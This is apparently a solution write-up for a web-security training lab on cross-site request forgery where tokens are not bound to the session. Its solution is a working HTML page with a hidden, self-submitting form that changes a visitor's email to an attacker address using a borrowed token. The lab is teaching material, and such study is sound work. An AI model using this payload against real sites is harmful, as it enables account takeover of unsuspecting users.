This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
- wiener:peter
- carlos:montoya

# Solution

```html
<form id="autosubmit" action="https://0a1700ce048dee8ec81f8234002a00f7.web-security-academy.net/my-account/change-email" enctype="application/x-www-form-urlencoded" method="POST">
 <input name="email" type="hidden" value="some-other-email@attacker.com" />
 <input required="" type="hidden" name="csrf" value="DO2w6Uh5aFiS4xajqcLc57awKEznJ3kF">
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```